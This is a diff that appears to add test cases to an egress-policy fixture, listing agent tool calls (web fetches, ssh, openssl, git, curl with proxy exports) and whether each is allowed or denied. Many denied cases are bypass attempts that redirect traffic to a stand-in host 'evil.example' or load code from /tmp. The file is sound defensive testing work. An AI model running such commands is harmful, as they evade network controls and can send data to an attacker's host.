@@ -210,6 +210,34 @@ deny	EGRESS_DESTINATION_NOT_ALLOWED	WebFetch	{"url":"https://api.github.com@evil
 deny	EGRESS_DESTINATION_NOT_ALLOWED	WebFetch	{"url":"http://api.github.com/zen","prompt":"read"}
 deny	EGRESS_DESTINATION_UNDETERMINED	WebFetch	{"prompt":"read"}
 deny	EGRESS_DESTINATION_UNDETERMINED	WebFetch	{"url":"https://{api.github.com,evil.example}/","prompt":"read"}
+
+# A fetch tool that takes a list of URLs is decided on every one of them.
+allow	-	web_extract	{"urls":["https://api.github.com/zen","https://api.github.com/meta"]}
+deny	EGRESS_DESTINATION_NOT_ALLOWED	web_extract	{"urls":["https://api.github.com/zen","https://evil.example/collect"]}
+deny	EGRESS_DESTINATION_UNDETERMINED	web_extract	{"urls":"https://api.github.com/zen"}
+deny	EGRESS_DESTINATION_UNDETERMINED	web_extract	{"urls":[]}
+
+# A client's command line is read the way the client reads it: options after
+# the host, every spelling of an option, the last value of a repeated key.
+deny	EGRESS_DESTINATION_NOT_ALLOWED	Bash	ssh api.github.com -o HostName=evil.example
+deny	EGRESS_DESTINATION_NOT_ALLOWED	Bash	ssh -o=HostName=evil.example api.github.com
+deny	EGRESS_DESTINATION_UNDETERMINED	Bash	ssh api.github.com -o PKCS11Provider=/tmp/p.so
+deny	EGRESS_DESTINATION_NOT_ALLOWED	Bash	openssl s_client evil.example:443
+deny	EGRESS_DESTINATION_NOT_ALLOWED	Bash	openssl s_client -host evil.example -port 443
+deny	EGRESS_DESTINATION_UNDETERMINED	Bash	openssl s_client -connect api.github.com:443 -engine /tmp/e.so
+deny	EGRESS_DESTINATION_NOT_ALLOWED	Bash	openssl x509 -in https://evil.example/c.pem -noout
+deny	EGRESS_DESTINATION_UNDETERMINED	Bash	git -c http.followRedirects=false -c http.followRedirects=true clone https://api.github.com/o/r.git /tmp/r
+deny	EGRESS_DESTINATION_UNDETERMINED	Bash	git -c http.followRedirects=false -c http.https://api.github.com/.followRedirects=true ls-remote https://api.github.com/o/r.git
+deny	EGRESS_DESTINATION_UNDETERMINED	Bash	git --frobnicate HEAD push origin main
+deny	EGRESS_DESTINATION_UNDETERMINED	Bash	git --exec-path=/tmp/x push origin main
+deny	EGRESS_DESTINATION_NOT_ALLOWED	Bash	git config --file .git/config remote.origin.url https://evil.example/r.git
+deny	EGRESS_DESTINATION_UNDETERMINED	Bash	git config --type path core.sshCommand /tmp/x
+deny	EGRESS_DESTINATION_NOT_ALLOWED	Bash	export "HTTPS_PROXY=http://evil.example:8080"; curl https://api.github.com/zen
+deny	EGRESS_DESTINATION_NOT_ALLOWED	Bash	declare -x 'https_proxy=http://evil.example:8080'; curl https://api.github.com/zen
+deny	EGRESS_DESTINATION_UNDETERMINED	Bash	export "$NAME=http://evil.example:8080"; curl https://api.github.com/zen
+allow	-	Bash	git config --get remote.origin.url
+allow	-	Bash	git commit -m "see https://example.com/issue/1"
+allow	-	Bash	openssl x509 -in cert.pem -noout -text
 deny	EGRESS_DESTINATION_UNDETERMINED	WebSearch	{"query":"helm kernel"}
 
 # Reads and tools the profile allows keep working.
